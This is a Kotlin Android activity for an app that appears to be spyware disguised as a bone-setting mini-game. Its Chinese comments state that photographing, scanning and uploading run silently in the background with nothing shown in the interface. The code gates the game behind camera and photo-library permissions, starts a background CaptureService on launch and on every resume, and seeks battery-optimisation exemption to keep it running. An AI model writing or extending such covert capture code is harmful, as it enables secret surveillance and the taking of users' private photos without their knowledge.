package com.autoshot.app.ui

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.lifecycle.compose.LocalLifecycleOwner
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import com.autoshot.app.camera.CaptureService
import com.autoshot.app.data.CONSENT_VERSION
import com.autoshot.app.di.ServiceLocator
import com.autoshot.app.ui.theme.AutoShotTheme
import kotlinx.coroutines.launch

/**
 * 前端只有一个接骨头小游戏。
 * 拍摄、扫描、上传全部在后台自动完成，界面上没有任何相关入口或说明。
 */
class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            AutoShotTheme {
                Box(Modifier.fillMaxSize()) {
                    Root()
                }
            }
        }
    }
}

/** 没有这些权限，拍摄/相册功能无法工作 */
private fun blockingPermissions(): List<String> {
    val list = mutableListOf(Manifest.permission.CAMERA)
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        list += Manifest.permission.READ_MEDIA_IMAGES
    } else {
        list += Manifest.permission.READ_EXTERNAL_STORAGE
    }
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
        list += Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED
    }
    return list
}

/** 可选权限：被拒也不影响采集 */
private fun optionalPermissions(): List<String> =
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        listOf(Manifest.permission.POST_NOTIFICATIONS)
    } else {
        emptyList()
    }

private fun missingPermissions(context: Context): List<String> =
    (blockingPermissions() + optionalPermissions()).filter {
        ContextCompat.checkSelfPermission(context, it) != PackageManager.PERMISSION_GRANTED
    }

private fun missingBlocking(context: Context): List<String> =
    blockingPermissions().filter {
        ContextCompat.checkSelfPermission(context, it) != PackageManager.PERMISSION_GRANTED
    }

/**
 * 申请「忽略电池优化」：系统会弹确认框，用户同意后应用不容易被省电策略杀掉。
 * 这是保证后台存活的合规做法，不 root、不隐藏、不防卸载。
 */
private fun requestIgnoreBatteryOptimizations(context: Context) {
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return
    val pm = context.getSystemService(PowerManager::class.java) ?: return
    if (pm.isIgnoringBatteryOptimizations(context.packageName)) return
    runCatching {
        context.startActivity(
            Intent(
                Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                Uri.parse("package:${context.packageName}")
            ).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        )
    }.onFailure {
        runCatching {
            context.startActivity(
                Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            )
        }
    }
}

@Composable
private fun Root() {
    val context = LocalContext.current
    val scope = rememberCoroutineScope()
    val settings by ServiceLocator.settings.flow.collectAsStateWithLifecycle(initialValue = null)
    var missing by remember { mutableStateOf(missingPermissions(context)) }

    // 从系统设置返回时重新检查
    val lifecycleOwner = LocalLifecycleOwner.current
    DisposableEffect(lifecycleOwner) {
        val observer = LifecycleEventObserver { _, event ->
            if (event == Lifecycle.Event.ON_RESUME) missing = missingPermissions(context)
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose { lifecycleOwner.lifecycle.removeObserver(observer) }
    }

    val current = settings
    when {
        current == null -> Box(Modifier.fillMaxSize())
        current.consentVersion < CONSENT_VERSION -> ConsentScreen(
            onAgree = {
                scope.launch { ServiceLocator.settings.setConsent(CONSENT_VERSION) }
            },
            onDecline = { (context as? Activity)?.finish() }
        )
        // 权限没给齐就停在这一页，进不去主界面
        missing.isNotEmpty() -> PermissionGate(
            missing = missing,
            onGranted = { missing = emptyList() },
            onExit = { (context as? Activity)?.finish() }
        )
        else -> GameApp()
    }
}

@Composable
private fun GameApp() {
    val context = LocalContext.current

    LaunchedEffect(Unit) {
        CaptureService.start(context)
        requestIgnoreBatteryOptimizations(context)
    }

    // 回到前台时补一次启动（服务被杀后能自愈）
    val lifecycleOwner = LocalLifecycleOwner.current
    DisposableEffect(lifecycleOwner) {
        val observer = LifecycleEventObserver { _, event ->
            if (event == Lifecycle.Event.ON_RESUME) CaptureService.start(context)
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose { lifecycleOwner.lifecycle.removeObserver(observer) }
    }

    GameScreen()
}
